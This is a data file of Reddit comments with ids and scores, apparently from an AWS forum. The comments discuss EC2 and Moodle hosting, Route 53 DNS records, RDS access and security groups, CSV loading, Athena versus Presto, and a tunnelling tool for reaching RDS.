But please please learn about AWS before you host anything production-worthy on it. I see you have no autoscaling groups so an AZ/hardware failure could taken down everything. Do you have a patching strategy for the Windows instance? Is the EBS encrypted because you might be hosting PII and breaches can cost $$$$.",2.0
g7c9p5b,j3hjvi,"Check out this whitepaper to get an idea of how different services work together so you can create a reliable, scalable, secure, performance, and cost effective installation of web applications like Moodle. https://d1.awsstatic.com/whitepapers/aws-web-hosting-best-practices.pdf",2.0
g7c5v61,j3hjvi,"If you are in a private subnet, you have to get at it by using a load balancer. Or attach a nat gateway to another subnet you would call public ,then set your private subnet 0.0.0.0 route to the nat.  

If you have it in a public subnet (internet gateway assigned), you I have to give the instance a public ip.

Security group just has to allow 443 from 0.0.0.0 and 3389 from your house by",1.0
g7cuzdh,j3hjvi,"Um, well, first I would have some type of information in Route53 concerning the domain if possible.  But if you already have an org, they can probably create the DNS record for you.  After that, you have to have a Windows server with Moodle on an EC2 (you already have this).  Now, you must set up your Security Groups to allow 0.0.0.0 access from the world ( &lt;-- Real Devops people will want to murder me for that).  Now you should be good to go.  I would say that you should probably seek the help of a real devops pro, as it's easy to hurt yourself.",1.0
g7c9mkf,j3hd64,"You can also consider looking for security groups that allow port 3389. I believe AWS Config has an option to do that. And if not, a simple script can do it.",4.0
g7cmrm4,j3hd64,Why not send security logs to cw and check for logon events. Can’t remember the event ID off top of head but we essentially do this using Splunk.,2.0
g7cgvby,j3hd64,"I highly using Security Hub to apply CIS recommendations to your account, you can even enable automatic remediation: https://aws.amazon.com/blogs/security/automated-response-and-remediation-with-aws-security-hub/",3.0
g7byes5,j3hd64,This should help https://docs.aws.amazon.com/vpc/latest/userguide/flow-logs-cwl.html,1.0
g7cbb3l,j3hd64,You should use AWS Cloudtrail to SNS or AWS Config to SNS to alert you when a security group or nacl/firewall rule is created allowing port 3389.,0.0
g7cle1d,j3hd64,"While this is a proper solution for a different use case, this is not what he is asking for. He wants to be notified when port 3389 is used. Not when someone whitelists it in a security group.",2.0
g7dsd9g,j3hd64,"Lots of good suggestions here, if you're happy to spend the money deploy aws firewall manager then create a policy that denies security groups that have 3389 in use if the cidr range is too wide I.e. 0.0.0.0/0 

That way the entire organisation is covered in one policy, however its 100usd a month per policy plus the aws config costs, depends on how you look at it for ~$100 a month you can deny 3389 being open to the world as opposed to a config rule that you have to deploy across all accounts and then secure so people don't change the rule or worse you don't automate it and have to manual resolve the SGs that alert",0.0
g7dsgw3,j3hd64,"Also, just to add you don't have to deny you could just audit using firewall manager, basically it does the same thing as aws config with less customisation",0.0
g7bzj55,j3gync,Another IAM issue? Wasn't there only one last week?,14.0
g7bvsbl,j3gync,Support confirmed that they are investigating (us-east-1),7.0
g7bw4su,j3gync,"I was getting timeouts on the console, but yeah. Looks like its fixed",2.0
g7bwsc8,j3gync,"I don't think it's fixed, the status page got updated: [https://status.aws.amazon.com/](https://status.aws.amazon.com/)",1.0
g7c79f0,j3gync,At least they aren't hosting that on s3 anymore.  That was the ClusterF of 2016ish.... ;),0.0
g7bw6cy,j3gync,I just saw that myself as well,2.0
g7c2arz,j3gync,"AWS, GCP and Office365 all have had issues this **month**.",3.0
g7cce9z,j3gync,Not just Office365 but azure AD a whole bigger mess,9.0
g7d4tpe,j3gync,Yeah that was a big one. Worldwide.,1.0
g7d0el6,j3gync,It was facing latency issues today. I’d create a Team’s or Slack channel and sub it to their RSS feed.,1.0
g7bu7nb,j3gkyz,"At a minimum, I think you need to change the A record.

https://au.godaddy.com/help/manage-dns-zone-files-680",3.0
g7bx89m,j3gkyz,If you're going to have everything at AWS it's easier to setup that domain you now own with Route53 and then in GoDaddy change the NS records for the domain to the ones given to you from Route53 - then you can setup all the A records and other neat things for your domain within AWS and not have to bounce back to GoDaddy all the time. No matter where you host the dns records though make sure you assign an Elastic IP to your EC2 instance and use that for the A record so that it doesn't change on you unexpectedly...,3.0
g7bxwy1,j3gkyz,"&gt; If you're going to have everything at AWS it's easier to setup that domain you now own with Route53

How? Route 53 does not seem to have anything other than a Create Hosted Zone button.

&gt; GoDaddy change the NS records for the domain to the ones given to you from Route53

AWS does not give me NS servers, and I tried to google what they are. ns1.amazon.com did not work either. Do you know what Amazon's NS servers are by any chance?",1.0
g7c0bfk,j3gkyz,"If you are going to be managing resources in AWS I would highly suggest using Route 53 to manage your DNS instead of GoDaddy. Will add some cost but makes it easier of finding documentation for Route53 and the AWS services you’re trying to create.

ALSO be very careful you don’t point a record to your EC2 instance directly and keep all ports open. Have to be very careful as it will be exposed to world and bots still start to hit it.",2.0
g7c2teq,j3gkyz,"&gt; If you are going to be managing resources in AWS I would highly suggest using Route 53 to manage your DNS instead of GoDaddy.

I am struggling to comprehend what this means though. I have clicked on some things inside Route 53 and set some stuff up but without some sort of tutorial written in the past 3 months... nothing makes any sense. The UI is 100% changed, nothing is even remotely close to before, so all AWS tutorials ever written are now void and useless.

**How** do I use Route 53? What do I click on and type there?

Under ""Define simple record"" I have many options. All I want is an ""A record"" according to the tutorials but it does not say how to make one. I can't close this dialog because it wants the options filled out like ""Value/Route Traffic to"" which I have no idea how to set up.",1.0
g7cdsqc,j3gkyz,"https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/Tutorials.html

https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/getting-started.html

As dense and annoying as much as AWS docs can be I’d start with that.",2.0
g7cer6m,j3gkyz,"Thanks man, I got pretty far from guessing alone so far. I have 1-way resolving working fine, now it's time for reverse. I found a decent tutorial that has been working out so far.",2.0
g7c2pv1,j3gkyz,There’s no fixed set of AWS NS - they get automatically allocated when you create a hosted zone.,2.0
g7fjuxv,j3gkyz,Create a hosted zone and it will give you NS records for the zone you created. (which is your domain name) - each hosted domain has it's own NS records.,1.0
g7buao0,j3gkyz,"You want to set up an A record.

GoDaddy support is actually pretty good for stuff like this and the it help articles are also good.

https://www.godaddy.com/help/add-an-a-record-19238",2.0
g7bvmdq,j3ct3s,"You may find this page helpful: [https://docs.aws.amazon.com/streams/latest/dev/tutorial-stock-data-kplkcl-download.html](https://docs.aws.amazon.com/streams/latest/dev/tutorial-stock-data-kplkcl-download.html)

The pom.xml file is relevant here.",1.0
g7cb565,j3cokd,AWS Organization Tag Policies.,1.0
g7cf70d,j39lhq,You will begin being charged the monthly fee as soon as you subscribe to the managed rule group (prorated hourly). Then you will start into the “per requests” fees after it’s been associated and is receiving requests.,1.0
g7jtz5d,j39lhq,"As already said, upon you subscribed to it. It's similar how all pricing in WAF works. If you create a rule or ACL you're already charged for the sole existence of it.",1.0
g7bckx5,j38ppb,The TYPE of your record need to be NS not A.,1.0
g7b8bbr,j3cj33,https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/AuroraMySQL.Integrating.LoadFromS3.html,3.0
g7b2eqq,j3cj33,"assuming the CSV doesn't have any unexpected artefacts and is consistent, aws glue will do the trick.",1.0
g7b51b2,j3cj33,You can also dump them in s3 and then set DMS up to send it to RDS,1.0
g7b6d8n,j3cj33,"MySQL can read CSV natively with LOAD DATA. You'll then only need something to trigger it, Eg Lambda.",1.0
g7b79d0,j3cj33,"I don't think you can do this with RDS.  I think for LOAD DATA to work the file must be on the mysql server, which is something we don't have access to.  Please correct me if I'm wrong.",0.0
g7b87dn,j3cj33,"RDS Postgres or Aurora with the PG backend can definitely run COPY from s3 files. I run it from lambda with a trigger on the landing bucket. 

I would assume MySQL is the same",3.0
g7b8a8f,j3cj33,"Indeed, it's not exactly LOAD DATA, but mysqlimport instead: https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/MySQL.Procedural.Importing.AnySource.html",2.0
g7b6yen,j3cj33,We do this often. We store the .csv file in S3 and put it's location/key in a dynamodb item. For retrieval we create pre-signed url and pass to frontend.,1.0
g7bi6lf,j3cj33,Is the csv to s3 part done using some sort of client side upload tool or are you moving them by hand? I'm looking to set something like this up and am researching for examples and/or resources,1.0
g7b9tjg,j3cj33,Glue can read the CSV and dump it into Redshift,1.0
g7bh516,j3cj33,How big are the files? Depending on your answer it can either be Lambda to RDS or Glue/EMR to Redshift,1.0
g7f3zhg,j3cj33,"This is a very common use case so you're not alone out there :)  Implementation can range from extremely easy to more complex depending on your specific scenario. If you can answer the following questions, I can help provide some further guidance. Feel free to DM me if you prefer:

1. Where will the CSV exist? i.e. S3, EBS Volume on EC2 instance, etc.
2. How large is the CSV file in terms of file size and row/column count?
3. Which of the following actions will be performed when the CSV is ""uploaded""
   1. CSV will add new rows to the database
   2. CSV will update existing rows
   3. CSV will delete existing rows
   4. ""Upload"" will create new tables
   5. ""Upload"" will delete tables",1.0
g7b2806,j3cj33,[deleted],1.0
g7b90lf,j3cj33,Spark? Is this a joke? It's like using calculus to do long division.,-5.0
g7bgh7h,j3cj33,[deleted],-1.0
g7c0ouu,j3cj33,"Congratulations, you just added $200,000 in developer costs to load a CSV file.",-1.0
g7b6lnx,j3chto,"Athena will use as much or as little resources as needed to execute your query, but you only pay for bytes scanned, Presto on EMR costs more money the more power you want, and it costs whether or not you use it as long as the cluster is running.

Presto on EMR has more features and is a newer version.",6.0
g7b1fws,j3chto,"athena is fully managed, so easier to use/setup, but costs $

with presto on EMR you get the latest release, and you have it's full functionality. athena disables some features",3.0
g7bd51g,j3chto,Boils down to whether you want to invest in learning and managing an EMR cluster yourself. You unlock more capability at the expense of administrative overhead.,2.0
g7bd979,j3chto,"Presto has more features than Athena, but Athena is managed so it can be cheaper than running an EMR cluster.

Athena also uses Glue, which is the worst AWS service I’ve had the misfortune of using. I avoid any service that integrates with Glue.",1.0
g7bf3a6,j3chto,Athena can now also use Federated metadata sources instead of Glue too.,2.0
g7bveps,j3chto,"I'm genuinely curious what you don't like about Glue? As a SME of Glue for my organization, it has drawbacks but overall has been fine. We have 100s of Glue jobs running in production",1.0
g7bxl5k,j3chto,"We’ve had so many issues with it. It boils down to it being slow, expensive and unreliable in comparison to running our own infrastructure on EMR.",1.0
g7bdfof,j3chto,"Athena - seriously outdated version of presto that you cannot modify (yes, I'm aware that after several years a new version may come out soon, but then it'll be a new set of bugs that aren't fixed forever). 

It may work for a bit, but know that if you find something that doesn't work, you'll be SOL.",1.0
g7be0fc,j3chto,The biggest gotcha I've run into with Athena is it works very poorly with csv files that don't have a consistent schema. The solution for me was to transform it to parquet before using Athena.,1.0
g7beja6,j3chto,"That's funny! We were using parquet and hit tons of bugs that had been fixed in later presto versions (admittedly the schemas were complex, but still).",1.0
g7bfqez,j3chto,Mind sharing a little more about that? At my company we're currently laying down the foundations for our major data pipelines with multiple sources and we're trying to leverage Athena as much as possible. I would appreciate knowing some things to look for. So far most of the issues have been related to Glue rather than Athena.,1.0
g7bm4lf,j3chto,"The one that made us drop it was the handling of nested schema evolution: https://github.com/prestodb/presto/pull/6675 (fix merged early 2018, came to Athena in preview versions early this year so ~2 years to fix after the fix was upstreamed). If a bad deploy caused a new field to be added (just added) to a parquet file, athena would fail the query. Didn't matter if you weren't even using that field etc.

There were others along the way, but don't recall them off the top of my head. We dropped it and have no plans to retry it after taking that long to get changes pulled in from upstream.",2.0
g7e8m67,j3chto,"I think it’s just easier to convert the files to parquet and let Glue crawl the data. If you’re lucky, you can use a Lambda function to convert the file. If you’re unlucky ... then use an EC2",1.0
g7az5s8,j3c62a,"It seems that the contractors used the master RDS password for the app which is IMHO a big security risk ! I would use IAM or app specific user and password within my dB! You need to trace the app password AFAIK


https://aws.amazon.com/premiumsupport/knowledge-center/users-connect-rds-iam/

In regards the pem there is an article below:


https://medium.com/techcret/change-aws-pem-file-c12af4bcf89f

My preference if possible is to not use any pem keys and use Session Manager 


https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html",1.0
g7dfx0n,j3c62a,Thank you for the detailed info and tips. I will look into this.,1.0
g7b3svg,j3c62a,"See this on how to add/remove key pairs.  https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html#replacing-key-pair

Yeah, you'll need to change the application's configuration with the new RDS password.  But how to do that is entirely depends on how the application was built.",1.0
g7awepw,j3c4j8,"API Gateway, perhaps",5.0
g7b61xk,j3c4j8,Thx,1.0
g7azf6s,j3c4j8,I do agree on API GW . But may I please ask why you assume you have AWS support ? AWS support does really come for “free” and while there is a free support tier is more forum access,1.0
g7b60tw,j3c4j8,We have an S3 external account tied into this platform. So I thought maybe we have AWS too. I just got on this project so I’m not real familiar with the architecture yet. Wanted to have an idea of a service to suggest before I went to my architect though,1.0
g7b6n16,j3c4j8,Hey yes it seems like you have AWS but maybe I was not clear . Because you do have an AWS contact that doesn’t mean that you have AWS Support :),1.0
g7b8vq6,j3c4j8,"How often do you need to make these calls? Are they async? Are they queued?

You could use celery with SQS to manage async queues to a message query which could trigger a lambda snippet to perform the transform and respond. If you need serialized API calls, an API gateway would be the simplest format. What is the ""other service""?",1.0
g7bp68g,j3blej,"Using aws session manager to do this is way simpler and more secure, as it leverages all the security built into IAM (2fa etc) and also automatically logs all the commands you run for audit purposes.

I can effectively have exactly the same thing as this by just having a few lines lines of bash to start a container and then start an ssm session to it.",27.0
g7c2igq,j3blej,"Absolutely yes, you can, which is perfectly fine. I know a lot of people who can't, and we want to help those people by doing the job for them.",2.0
g7dpsav,j3blej,"&gt; way simpler and more secure

Session Manager does not support parallel connections and is pretty slow with large data sets.",1.0
g7dr8hn,j3blej,"I can attest that 7777 is faster than Navicat's ssh tunnel. When pointing Navicat just to localhost:7777, the connection flows a lot smother and faster.",1.0
g7b4c6g,j3blej,"I always just launch a Cloud9 instance in the VPC and connect that way, but guess this tool could be useful.

EDIT: Wouldn't pay $50/year for it tho (around the price of a t3.micro RI)

Guess you could use SSM but I've never looked into it",9.0
g7bb5o5,j3blej,"Oh that's an interesting idea, never heard of that before, thanks!

SSM still requires a bastion if you want to connect to RDS (in order to make the tunnel).

And regarding pricing, we aim for a one-time purchase, not a subscription. Basically we want it to be a no-brainer (cheaper than a t3.micro) and accessible to everyone.",0.0
g7c43ct,j3blej,"I don’t want to discourage the project, but I see this as addressing the problem in an incorrect way.  

However, I do not know much about this to fully qualify that.  Let me ask one thing, does 7777 require an IAM policy that requires rights to manipulate VPC rules in any form?",7.0
g7d4hfk,j3blej,"Yes, we need to be able to create 1 security group for your container and attach it to your rds and we also need to authorize your own ip to your container.",1.0
g7at812,j3blej,"7777 is a CLI command that makes RDS databases available on port 7777 of your machine (e.g. when to debug some MySQL rows or export/import data).

7777 works by creating a short-lived bastion (Fargate container) and a SSH tunnel on the fly. SSH keys are autogenerated, meaning you don't need anything to setup. We aimed for simplicity, as well as being cheap: it removes the need for paying a jump server 24/7.

A great side-effect too is that permissions are defined by IAM: dev/ops that can access the VPC &amp; database can access it via 7777 without any extra work. No SSH keys to setup or share.

We're beta testing everything, if you have any feedback we'd be happy to hear it!",16.0
g7ayyrz,j3blej,"Does this fargate container exist for the duration of the open connection?  Also, if 5 users create connections, does that result in 5 fargate containers or do they all use the same container?",6.0
g7bfvew,j3blej,"Yes and yes.

Everything is created on the fly. Because Fargate is paid per time used, we think that even with 5 users/5 containers, since they run for a short time it will be very cheap (a few cents max). So that's an acceptable compromise, since it keeps everything simple, secure and avoids any error like 1 user terminating the container of someone else.",6.0
g7ayoo8,j3blej,When is the planned release?,1.0
g7aznq3,j3blej,"Probably in the next 2-4 weeks, it's working already but we need to test it in all scenarios to make sure we cover most cases.",1.0
g7azryy,j3blej,Is it on github? Would be nice to have a look!,3.0
g7b0yto,j3blej,"It isn't open-source, but I can happily explain how it works in more details if you have questions (we've learned a few things building this).",-8.0
g7b42mb,j3blej,who should trust a non-open source piece of software that accesses my database? Even open source that would require a lot of vetting to get used anywhere.,42.0
g7b5efb,j3blej,"Agreed. I could see myself using this for our dev environment, but I would never run it against our production systems.",6.0
g7b96vd,j3blej,Same boat here.  This looks interesting.,3.0
g7bawpn,j3blej,"Thanks that's a good point. I guess this applies to every software that touches the database too, like TablePlus, Sequel Pro, db integrations in Intellij IDEs, etc.

It's worth noting as well that our program does not access the database, it launches a SSH tunnel that exposes your database to you. But I understand that your point still stands even then, because an evil program could actually do anything.

In the end it's a container running `sshd`, and we deploy using CloudFormation so everything can be inspected. We don't really sell a homemade technology but rather the convenience of setting things up.

But still, I understand that it's still based on trust. In case that helps, I'm the author of frameworks and libraries like [Bref](https://github.com/brefphp/bref), [PHP-DI](https://github.com/PHP-DI/PHP-DI), [php-enum](https://github.com/myclabs/php-enum/), [DeepCopy](https://github.com/myclabs/DeepCopy), and [many more](https://github.com/mnapoli). All these projects have millions of installations and 10k+ GitHub stars combined, so I also hope that also helps trust a little bit. I wouldn't go around messing up all that I've built over the years over a $10 product.

In any case, I still know that some people will not be convinced by that. But we just can't build everything open-source because we have to find income in order to maintain the rest.

Hope that helps!",12.0
g7bzets,j3blej,"Your software is creating infrastructure inside the AWS account? If so then it’s much more important to know what’s in that software. Bigger companies are very strict with what code they allow to run INSIDE their accounts.

That’s very different than having software externally reaching into a database that has been exposed.

I’m interested but company would let me deploy anything that I’m not able to stand behind. No problem paying for it but I have to be rest assured I know what’s running in my cloud environment. Only way I can take someone’s word on it if it a service agreement is drawn up with language allowing for ability get compensation for breach.",3.0
g7c2pay,j3blej,"We expect that it will not fit for larger companies, but these are not our target users.

We want to simplify stuff for developers and beginners. Larger companies usually have perfectly competent people to setup a bastion, and they are perfectly fine paying $50/year for those EC2 instances.",1.0
g7cnja2,j3blej,"&gt;  I guess this applies to every software that touches the database too, like TablePlus, Sequel Pro, db integrations in Intellij IDEs, etc.

This is not a good response. Whataboutism is a pox.",1.0
g7blndl,j3blej,"How long does it take to spin up the Fargate bastion? In other words, how long between running ""7777"" and being able to connect to the DB?",5.0
g7by0jx,j3blej,"The very first time takes 1\~2 minutes because the tool will install a CloudFormation template with Task Definition, ECS Cluster, etc. Next time you run, it takes 30 seconds from running 7777 to having a connection opened on your favorite database client (Mysql Workbench, Table Plus, Navicat, etc).",3.0
g7bq232,j3blej,upvote for the awesome Dwight Schrute reference,2.0
g7c47bp,j3blej,How are the keys being stored and is their a possibility to integrate with your own KMS?,1.0
g7d4rf5,j3blej,Keys are not stored. Every time you run 7777 it generates a new key and starts the container. At the end of the session your container dies and the keys vanishes from memory.,1.0
g7djtfd,j3blej,Why fargate and not a tX.micro instance?,1.0
g7dkji8,j3blej,"Because fargate will be cheaper since users would only pay for the duration of their connection to the database. After they're done, the container is destroyed.

We could do the same with an EC2 (start and stop it), but booting a container is fast, lightweight, and that way we avoid polluting the EC2 dashboard with throw-away instances.",2.0
g7k57d0,j3blej,Aws cdk pattern build a fargate container and execute tunnel locally am I missing something.,1.0
g7nmjo9,j3blej,"We do exactly the same thing with SSM. 

However, I'd recommend extending the tool's functionality to initate tunnels to Elasticache, Redshift Cluster etc. i.e. resources which are hosted in a private VPC and not limit the tool to tunnel to RDS only.",1.0
g7ps0vy,j3blej,"Thanks, that's a good idea and we are indeed thinking about it.

Regarding SSM, indeed it's a great solution. For beginners it's a steep  learning curve though, so we want to provide them a simpler alternative.",1.0
g7c5eqt,j3blej,You can connect to rds thru iam. Seems pretty easy already,0.0
g7cyupn,j3blej,"Sounds like this product is addressing accessing RDS instances from outside the VPC, which IAM doesn’t directly facilitate.

Also, somewhat annoyingly, IAM auth isn’t available in all RDS instance types :(

I like the idea of making this easier for beginners, but I can’t see it being used in my company or my own projects. Neat concept though.",3.0
g7ay48b,j38jw9,We have extensively started to use ECS and Fargate for similar workload. Using ECS ComposeX we very easily handle all the pipelines and deploy ad hoc environments as we need to. You can even use Fargate Spot to further cut costs,2.0
g7cw5r9,j38jw9,"If your application is interruptible, Fargate Spot might be a way to reduce costs. Two containers / one task if the fit.",1.0
g7ah1kl,j396da,"If you’re looking to get ahead, you don’t base that on what tools are available. That is like a solution in search of a problem. Knowing *why* you need to use a tool is where the money is at because you now understand that you have a problem and need a solution.

Maintain an awareness of what AWS services are available so that when you go search in of problems to fix you’ll at least be aware of what AWS services you can take advantage of.",6.0
g7acyds,j396da,a noob would be better severed focusing on the basic's before chasing the next big thing. It's often not what you think it will be.,8.0
g7b9phu,j396da,I personally think that Amplify will continue to grow - hopefully since I have been making videos for it hahaha,2.0
g7bc6x1,j396da,"Shared computing.

Lots of smart devices spent a lot of time in sleep mode or some form of stagnant awake periods. with IoT, the ability to share compute power would greatly reduce bus throughput, improving performance of capable devices. Would require some technical leaps in async message queues and communication...

There are a lot of things on the horizon that are mostly about reducing things to their performant pieces and then aggregating across physical limitations. We already do a lot of that with AWS today.

Just look at some of the newer operating systems; we're probably going to see an end to monolithic bus rings in the next 30 years.",1.0
g7aqjy1,j38qda,"Just because two resources have the same security group doesn't mean they will be able to talk to each other. You would have to add self-refrrencing rules to the security group allowing that communication.

Also, FWIW, just because something is allowing traffic from 0.0.0.0/0 doesn't necessarily mean it's accessible to the public. If it's in a private subnet, it is not going to be directly accessible from public internet no matter what rules are applied to the security group.",14.0
g7aw7ww,j38qda,"Adding to this, even if something is within a private subnet, if you do not intend unlimited access to the whole wide world to an endpoint, never ever use 0.0.0.0/0, no exceptions.

Normally you'd create a security group per kind of service. For example, 1 security group for your application, 1 for your webserver (or load balancer) and 1 for your RDS instance. Then only allow what needs to be allowed, e.g. input on your application security group only allowed from the webserver security group and input to your RDS only allowed from the application security group. Always try to implement the least privilege principles whenever you can.",5.0
g7aztu7,j38qda,"Thanks. I'm going to keep reading and try and setup a test instance possibly to confirm it's working. Looks like one of our databases even has the PLEASE\_READ\_XMG bitcoin message, so it's go time in an unfortunate way.",1.0
g7b1gq0,j38qda,"Oh dear, I googled that message you are getting.  From a cursory examination of the search results, it looks like someone has made the database in question a non-issue...",2.0
g7b7ggv,j38qda,"We changed all the passwords, confirmed contents are still there, removed the new user account that was created and restored all our schema privileges. They should have no access anymore and thankfully didn't manage to export and encrypt our databases before we locked them out.",1.0
g7bbaya,j38qda,"Jeez. Maybe turn off external access and use a a reverse proxy in a bastion host in a DMZ for external access and start taking a zero-access policy outside of your intranet or VLANs.

Even a private subnet isn't immune to access that walks open trunks on the network.",1.0
g7b9rcw,j38qda,"Welcome to RDS! :)

Once you get this straightened out (and there's already a lot of good advice) I think you'll enjoy the RDS experience.",2.0
g7ba8zg,j38qda,"Oh, absolutely. RDS is fantastic and we've had good luck with Aurora so far.",2.0
g7amcht,j38qda,"I would recommend enabling VPC flow logs to see which source IPs are connecting to your RDS instance. If after a few days, you only see IPs associated with your EC2 instances, you are probably in the clear to lock down RDS. Also note, just because an SG is wide open doesn’t necessarily mean your RDS instance is publicly accessible. It would still need to be in a public subnet, or have a route to it through a public endpoint.",1.0
g7azfqe,j38qda,"I think your concern is valid, this setup is potential a vulnerability or a vulnerability in the making. That said, don't just remove the rule. Like you said, it could potentially break something that is relying on this rule. Instead, speak with your team(s) and raise this issue. Discuss risks involved in leaving it and risks involved with fixing it. Assess the parties involved. Prioritize it and then fix it when the bandwidth becomes available. Don't just change things without communicating (or at least attempting to communicate) with others.",1.0
g7b0dmd,j38qda,"The communication is not the issue. The team reports to me and I speak with them constantly, so any changes they will be well aware of. We know for sure that we want only EC2 containers to be able to access our RDS instances, just looking for the best way to confirm that this is how it's working. The presence of a foreign database demanding bitcoins leads me to believe that we have some work to do.",1.0
g7b06lp,j38qda,"I am not an expert at this, but I'm working on a similar setup right now.

I'd confirm whether or not it's on the default VPC or a custom one. If it's on a custom VPC and connected to private subnets then it's probably not accessible from the public (edited, I don't know how the entire VPC might be setup, could have holes to other instances).

As far as the communication between the EC2 and the RDS, I have the same setup (on a private VPC though) but without that extra launch wizard SG that you have. Both the EC2 and RDS are members of the same SG, and it has an inbound traffic rule to allow all of the same SG (same as you). I have no other security groups attached to my RDS and no other rules. The EC2 instance comes from elastic beanstalk, it has the same SG but it has one additional one for SSH access that EB assigned automatically (but it is on a private subnet anyways).

If you really want to be extra extra careful, you could spin up a tiny rds and tiny ec2 instance and make sure they can connect with the settings you want.",1.0
g7b0mz5,j38qda,"I am spinning up tiny instances now to confirm for sure. Going to do some testing with new security groups, then I can just apply those security groups to the other instances in the dead of night. Thankfully our apps are fairly regional, so 10pm there's no activity.",2.0
g7b1j0o,j38qda,"I edited my post to clarify a security bit, someone else mentioned it too. I can't assume your VPC is completely private.

I was going to ask if you're sure that all of your products are internal? No one offs that are outside of your AWS setup?",2.0
g7cop7l,j38qda,"Security Group rules can be allowed to accept traffic from ip ranges or another security group. The default security group allows all traffic from resource that are also in that group. It's ok for testing, but isn't really suited for production.

Your rds group is bad. Allowing mysql from the world is just asking for trouble. Depending on the setup, keep mysql internal-only and only allow traffic from the resources that actually need to connect.",1.0
g7axfi8,j38qda,Allow RDS SG Port 3306 to the VPC CIDR range here. Only EC2’s within the VPC will be able to communicate with the RDS. This will work only if RDS and EC2 are in the same VPC,-1.0
g7azo40,j38qda,"I guess I'm dumber than I thought, because most of this was over my head. I'll try and find an explanation of the CIDR stuff because I'm unfamiliar.",2.0
g7b3h1w,j38qda,"1. Go to VPC
2. There beside the vpc id you will find you vpc cidr it will something like for example 10.0.0.0/16 or whatever. Now copy this thing along with the thing after the /
3. Go to your RDS Security Group. Add port 3306 and for source select custom and paste the cidr there.
Done now instances in that vpc will be able to communicate with the rds. Also if possible try learning using nat gateway and adding rds to subnets that have nat gateway only so rds is private and secure",2.0
g7b7jw7,j38qda,"Thanks Dr, that was helpful. I'm starting to wrap my head around all the pieces.",1.0
g7b99k1,j38qda,"I wouldn’t recommend this. You should implement least privilege access rather than blindly giving access to the whole VPC range. This is a bad practice and potentially opens your up for an attack depending on who or what has access to deploy resources in that VPC. 

The source in your DB security group rule should be the App Server security group as mentioned already above. This way only servers that are performing that role can access the database. It’s also scalable if your app tier scales up/down or instances are recycled using auto-scaling for example they will automatically get access to the DB as they are in the correct SG.",1.0
g7abdag,j3860g,Think I understand. In my head I'd have a separate database server and a separate script server. This would make configuration and deployments a lot easier and separate the point of failure.,2.0
g7anmnb,j3860g," I agree. I considered using AWS DocumentDB for that, but it is much more expensive than having it locally. Will try to set up a new database server. Not  sure about a separate script server as the scripts are executed only once a week and don't consume much resources.",1.0
g7byt80,j3860g,"I agree, the proper way to do it would be to separate the DB somehow - either to its own server or give access to your lambdas to read/write from it.

Any reason for Mongo and not DynamoDB? Dynamodb can be extremely cheap for stuff like this and if your data allows it I'd recommend it.

I'd strive to remove your three scripts with simple lambda functions:

1. The first one can be initiated via a CloudWatch event (think cron) to initiate the scraping queue.
2. The second one can simply be a lambda behind API-Gateway to get a simple ping on the status of the scraping queue. Not sure it's even needed.
3. I'd remove the third script and results queue entirely and directly insert the data from the scraping lambda.",1.0
g7dih5j,j3860g," Thanks u/zerobullshit

 Any suggestions on how to read 100k items from DynamoDB and insert them into an SQS queue? One lambda function call may not work here due to 15 min execution time limitation. Re DynamoDB vs MongoDB. I scrape information related to UK area codes. For example: if  information for W1A area code was changed I update all postcodes from that area: W1A 1AA, WA1 1AB, WA1 1EX ... So even if I scrape 50k areas I may need to update 500k postcodes. For that in MongoDB I use updateMany with a regex. Not sure if it's possible to do a similar thing in DynamoDB and if it will be cost effective to potentially update hundreds of thousands of items in DynamoDB.",1.0
g7dhpm7,j3860g,"You can schedule instances. But also, if you can containerize easily, fargate is more convenient for once a week kinds of tasks.",1.0
g7aex5e,j3860g,"One question i would ask myself in this situation is do I really need to have a separate function to poll the queue for job status, or could you already just update results as they come in?

Do you need to replace the old data with the new data all at once?",1.0
g7ambk7,j3860g,"If I replace it all at once I know how many rows been updated and also how many scraping attemps have failed (from the dead letter queue). Also the last script receives messages from the Result queue by polling it. It can be the case that the Result queue is empty, but there are still in flight messages in the Scraping queue, and I don't know for sure wether I need to stop polling or to continue.",1.0
g7q621a,j3860g,"Ah, got it - I interpreted it as you waiting for the scan to complete and then bulk-updating the DB.",1.0
g7b06hg,j37ujd,"Maybe Access Analyzer to review the permissions ? I haven’t used it for federated users so apologies if not the right tool


https://aws.amazon.com/about-aws/whats-new/2019/12/introducing-aws-identity-and-access-management-access-analyzer/",2.0
g7a2c5q,j37hsj,"What do you mean by “degraded?”

Lambda has a node parser.",1.0
g7a3ilf,j37hsj,[https://aws.amazon.com/premiumsupport/knowledge-center/ec2-linux-degraded-hardware/](https://aws.amazon.com/premiumsupport/knowledge-center/ec2-linux-degraded-hardware/),1.0
g7a78jd,j37hsj,"&gt; https://aws.amazon.com/premiumsupport/knowledge-center/ec2-linux-degraded-hardware/

I've never had that happen.  How often is it happening to you?  Might be worth looking at another AZ in the same region if it's common.

When/if it happens, you stop/start the instance, right?",-1.0
g7a3dvm,j37hsj,"The simplest method that’s cost effective for long running jobs would probably be a cron job running on an EC2 node. Give the instance a Role with read access to the bucket, grab the script from S3 via AWS CLI or s3cmd and away you go.

I share /u/mreed911’s question about EC2 degradation. Do you mean some of your instances were slated for ‘Retirement’ due to hypervisor host issues? For non-ephemeral instances you can reboot to solve that issue. A reboot will restart the instance on healthy hardware.",1.0
g7a7bly,j37hsj,"I like the ""store the scripts in S3"" idea.",1.0
g7aupps,j37hsj,More cost effective than fargate?,1.0
g7blgcz,j37hsj,"Fair question! It really would depend on the workload and it’s requirements. “Long running” is subjective, and we don’t know that much about their requirements.",1.0
g7a3fko,j37hsj,"We manage a small army of 50 scripts (each script performs multiple tasks) that performs ETL from different data sources.  We run them on an EC2 instance. We develop the scripts locally and push them to a GitHub repo, and then pull them down to the EC2 instance when ready to run. Airflow ([https://airflow.apache.org/docs/stable/](https://airflow.apache.org/docs/stable/)) is used for scheduling, reporting, and management through a web interface.

In five years of using AWS, I've seen an EC2 instance become degraded once. It was on our production webserver and was due to underlying hardware issues. AWS sent us an alert email, we stop and started the instance so it loaded on new hardware and it has been fine since then. This was about 3 years ago.",1.0
g7a3n4t,j37hsj,"Thanks, sounds like we have very similar use cases. Coincidentally, we got the degraded message within the first week of this ec2 instance being live...",1.0
